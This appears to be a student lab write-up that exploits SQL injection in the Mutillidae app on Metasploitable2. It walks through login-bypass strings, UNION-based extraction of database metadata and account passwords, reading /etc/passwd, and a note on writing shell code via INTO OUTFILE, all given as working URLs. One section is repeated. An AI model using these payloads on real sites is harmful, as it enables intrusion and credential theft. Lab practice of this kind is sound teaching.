# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/1808charitha/sqlinjection/assets/132996838/fcff12b8-2fac-4c61-b1bc-e92d5bb0be95)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/b76879fa-4a43-4d8f-b16f-4f2f31159979)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/c1280ee0-adad-409e-bc71-7d79e99df9a1)
Click on the menu Login/Register and register for an account
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/342afadd-8209-41ee-b110-955d18d1f9dd)
Click on the link “Please register here”
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/e44d8f2a-58a7-41cd-aa87-44104c4f9b6c)
Click on “Create Account” to display the following page:
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/4b4feb62-6691-4265-bb47-c639720bb930)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/1808charitha/sqlinjection/assets/132996838/ade3a828-92d0-4f6d-94e4-00fad6808a6b)
Click “Login”. The logged in page will show as below:
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/5950938d-b720-410e-ba3f-eef14b065fdc)
##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/1808charitha/sqlinjection/assets/132996838/eb69f220-af20-4bd3-aac9-45731f6623ba)
Click the login button and you will see it enter into the administrator page.
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/58ea7d70-1a83-4ef1-9201-df9365199229)
Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/7dec9c8e-70e1-49b0-9997-748d45f81836)
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/c3a3ca3d-6b73-4fac-aa62-7aa952d8cfa2)
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/a7ea6b3c-10d0-4bb9-9985-934d2cf2b624)
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/e6660171-7b81-40b3-8722-a22710700922)
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/ccb96ae8-0976-43f0-bf12-442b0d1614e5)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/43c86048-1c5e-464b-a19c-2c2a2ff3d350)
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/4d9bd9f4-e670-4a84-9b1b-2083b9177f8b)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/e09c7e21-04dc-44a0-830e-ee3050ef1853)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/40973f2a-4e71-4e86-8a77-bc924b923e38)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/29d84c00-8fca-47f3-9cbf-6be038749af0)
As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/e44c1e18-013b-4df5-be49-721d0d54aea4)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/9eb7e918-d3ce-4f18-9e1b-97fdbeb3fbde)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/c4863a6c-a2cb-4172-86a9-5680bbf7a05c)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/1808charitha/sqlinjection/assets/132996838/e88fc598-552d-4452-b166-74c6de989bdf)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/397dcc26-1e50-4a3d-a29c-925f1708255d)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/4b2bc819-ead6-46e5-a2af-f0ad5f8c06b2)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/af021188-9259-429b-8af2-e1e710eb6b45)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/20d94dd5-486d-4b9d-ab2a-14f77c5f6a0c)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/7a368f02-71ae-47bb-ae84-c12cfe7f624c)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/d46483e0-2a60-43d3-81fe-968d19b6677d)
Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/1808charitha/sqlinjection/assets/132996838/14c40630-fcd7-4006-9e5b-ffc1c5317bbd)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
